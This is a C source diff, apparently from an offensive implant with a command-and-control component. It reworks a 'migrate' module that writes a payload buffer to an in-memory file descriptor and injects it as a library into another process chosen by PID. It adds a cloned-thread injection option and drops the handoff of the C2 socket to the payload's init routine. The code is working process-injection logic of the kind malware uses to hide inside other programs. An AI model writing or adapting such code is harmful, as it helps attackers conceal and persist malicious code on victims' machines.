@@ -30,9 +30,10 @@
 #include <injector.h>
 
 #include <c2.h>
+#include <log.h>
 #include <migrate.h>
 
-int migrate_init(c2_t *c2, pid_t pid, int length, unsigned char *buffer)
+int migrate_init(pid_t pid, int length, unsigned char *buffer)
 {
 #if defined(__linux__) || defined(__unix__)
     int fd;
@@ -45,7 +46,7 @@ int migrate_init(c2_t *c2, pid_t pid, int length, unsigned char *buffer)
         write(fd, buffer, length);
         sprintf(image, "/proc/self/fd/%d", fd);
 
-        migrate_inject(c2, pid, image);
+        migrate_inject(pid, image);
         return 0;
     }
 #endif
@@ -53,32 +54,32 @@ int migrate_init(c2_t *c2, pid_t pid, int length, unsigned char *buffer)
     return -1;
 }
 
-int migrate_inject(c2_t *c2, pid_t pid, char *image)
+int migrate_inject(pid_t pid, char *image)
 {
     injector_t *injector;
-    void *handle;
-
-    handle = NULL;
 
     if (injector_attach(&injector, pid) < 0)
     {
         return -1;
     }
 
-    if (injector_inject(injector, image, &handle) < 0)
+#ifdef INJECTOR_HAS_INJECT_IN_CLONED_THREAD
+    if (injector_inject_in_cloned_thread(injector, image, NULL) < 0)
     {
         goto fail;
     }
-
-    if (injector_call(injector, handle, "init", c2->fd) < 0)
+#else
+    if (injector_inject(injector, image, NULL) < 0)
     {
         goto fail;
-   }
+    }
+#endif
 
     injector_detach(injector);
     return 0;
 
 fail:
+    log_debug("* Failed to do inject (%s)\n", injector_error());
     injector_detach(injector);
     return -1;
 }
